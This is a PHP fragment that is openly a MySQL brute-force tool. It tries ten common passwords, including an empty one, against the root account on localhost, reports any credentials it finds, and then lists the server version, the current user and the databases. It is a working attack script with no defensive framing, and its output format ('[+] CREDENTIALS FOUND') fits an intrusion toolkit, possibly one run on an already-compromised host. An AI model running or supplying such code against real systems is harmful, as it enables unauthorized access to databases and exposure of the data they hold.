ob_start();

if (!extension_loaded('mysqli')) {
    ob_end_clean();
    return "ERROR: mysqli extension not available";
}

$host = '127.0.0.1';
$port = 3306;
$username = 'root';
$delay = 1;

$passwords = [
    '',
    'root',
    'password',
    '123456',
    'admin',
    'mysql',
    'toor',
    'qwerty',
    '123456789',
    'letmein'
];

try {
    $success = false;
    $attempted = 0;
    $output = "[+] Starting MySQL brute-force on $host:$port\n";
    $output .= "[+] Target user: $username\n";
    $output .= "[+] Passwords to try: " . count($passwords) . "\n\n";

    foreach ($passwords as $pwd) {
        $attempted++;
        $output .= "[$attempted] Trying: '$pwd' ... ";

        mysqli_report(MYSQLI_REPORT_OFF);

        $mysqli = new mysqli($host, $username, $pwd, '', $port);

        if ($mysqli->connect_error) {

            $errno = $mysqli->connect_errno;
            // 1045 = Access denied
            // 2002/2003 = Connection refused / timeout
            if ($errno === 2002 || $errno === 2003) {
                ob_end_clean();
                return "ERROR: Cannot connect to MySQL ($host:$port) - service down or filtered";
            }
            $output .= "FAILED (Access denied)\n";
        } else {
            $output .= "SUCCESS!\n";
            $output .= "\n[+] CREDENTIALS FOUND:\n";
            $output .= "    Host: $host:$port\n";
            $output .= "    User: $username\n";
            $output .= "    Pass: " . ($pwd === '' ? '(empty)' : $pwd) . "\n\n";

            $version = $mysqli->server_info ?? 'unknown';
            $user = $mysqli->query("SELECT USER()")->fetch_row()[0] ?? 'unknown';
            $dblist = $mysqli->query("SHOW DATABASES");
            $dbs = [];
            if ($dblist) {
                while ($row = $dblist->fetch_row()) {
                    $dbs[] = $row[0];
                }
            }

            $output .= "[+] MySQL Version: $version\n";
            $output .= "[+] Connected as: $user\n";
            $output .= "[+] Databases:\n    - " . implode("\n    - ", array_slice($dbs, 0, 10));
            if (count($dbs) > 10) {
                $output .= "\n    ... (+ " . (count($dbs) - 10) . " more)";
            }
            $output .= "\n";

            $mysqli->close();
            $success = true;
            break;
        }

        $mysqli->close();

        if (!$success && $attempted < count($passwords)) {
            sleep($delay);
        }
    }

    if (!$success) {
        $output .= "\n[!] No valid password found.\n";
    }

    ob_end_clean();
    return $output;

} catch (Exception $e) {
    ob_end_clean();
    return "ERROR: Brute-force failed - " . $e->getMessage();
}
